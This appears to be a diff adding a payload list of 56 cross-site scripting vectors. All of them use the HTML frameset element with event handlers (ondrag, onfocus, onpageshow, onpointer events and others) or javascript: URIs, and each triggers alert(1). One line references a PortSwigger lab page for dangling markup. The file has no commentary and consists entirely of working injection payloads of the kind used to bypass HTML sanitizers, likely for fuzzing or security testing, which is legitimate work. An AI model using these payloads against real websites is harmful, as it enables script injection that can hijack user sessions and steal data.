@@ -1,0 +1,56 @@
+<frameset draggable="true" ondrag="alert(1)">test</frameset>
+<frameset draggable="true" ondragend="alert(1)">test</frameset>
+<frameset draggable="true" ondragenter="alert(1)">test</frameset>
+<frameset draggable="true" ondragleave="alert(1)">test</frameset>
+<frameset draggable="true" ondragstart="alert(1)">test</frameset>
+<frameset id=x tabindex=1 onactivate=alert(1)></frameset>
+<frameset id=x tabindex=1 onbeforeactivate=alert(1)></frameset>
+<frameset id=x tabindex=1 onbeforedeactivate=alert(1)></frameset><input autofocus>
+<frameset id=x tabindex=1 ondeactivate=alert(1)></frameset><input id=y autofocus>
+<frameset id=x tabindex=1 onfocus=alert(1)></frameset>
+<frameset id=x tabindex=1 onfocusin=alert(1)></frameset>
+<frameset onafterscriptexecute=alert(1)><script>1</script>
+<frameset onbeforecopy="alert(1)" contenteditable>test</frameset>
+<frameset onbeforecut="alert(1)" contenteditable>test</frameset>
+<frameset onbeforepaste="alert(1)" contenteditable>test</frameset>
+<frameset onbeforescriptexecute=alert(1)><script>1</script>
+<frameset onblur=alert(1) tabindex=1 id=x></frameset><input autofocus>
+<frameset onclick="alert(1)">test</frameset>
+<frameset oncontextmenu="alert(1)">test</frameset>
+<frameset oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<frameset oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<frameset ondblclick="alert(1)" autofocus tabindex=1>test</frameset>
+<frameset onfocusout=alert(1) tabindex=1 id=x></frameset><input autofocus>
+<frameset onkeydown="alert(1)" contenteditable>test</frameset>
+<frameset onkeypress="alert(1)" contenteditable>test</frameset>
+<frameset onkeyup="alert(1)" contenteditable>test</frameset>
+<frameset onmousedown="alert(1)">test</frameset>
+<frameset onmouseenter="alert(1)">test</frameset>
+<frameset onmouseleave="alert(1)">test</frameset>
+<frameset onmousemove="alert(1)">test</frameset>
+<frameset onmouseout="alert(1)">test</frameset>
+<frameset onmouseover="alert(1)">test</frameset>
+<frameset onmouseup="alert(1)">test</frameset>
+<frameset onmousewheel=alert(1)>requires scrolling
+<frameset onpageshow=alert(1)>
+<frameset onpaste="alert(1)" contenteditable>test</frameset>
+<frameset onpointerdown=alert(1)>XSS</frameset>
+<frameset onpointerenter=alert(1)>XSS</frameset>
+<frameset onpointerleave=alert(1)>XSS</frameset>
+<frameset onpointermove=alert(1)>XSS</frameset>
+<frameset onpointerout=alert(1)>XSS</frameset>
+<frameset onpointerover=alert(1)>XSS</frameset>
+<frameset onpointerrawupdate=alert(1)>XSS</frameset>
+<frameset onpointerup=alert(1)>XSS</frameset>
+<frameset><frame id=x onfocus=alert(1)>
+<frameset><frame id=x onfocusin=alert(1)>
+<frameset><frame onload=alert(1)>
+<frameset><frame src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name="
+<frameset/onpageshow=alert(1)>
+<frameset onScroll frameset onScroll="javascript:javascript:alert(1)"></frameset onScroll>
+<frameset onFocus frameset onFocus="javascript:javascript:alert(1)"></frameset onFocus>
+<frameset onBlur frameset onBlur="javascript:javascript:alert(1)"></frameset onBlur>
+<frameset onload=javascript:alert(1)>
+<FRAMESET><FRAME SRC="javascript:javascript:alert(1);"></FRAMESET>
+<frameset onload=javascript:javascript:alert(1)></frameset>
+
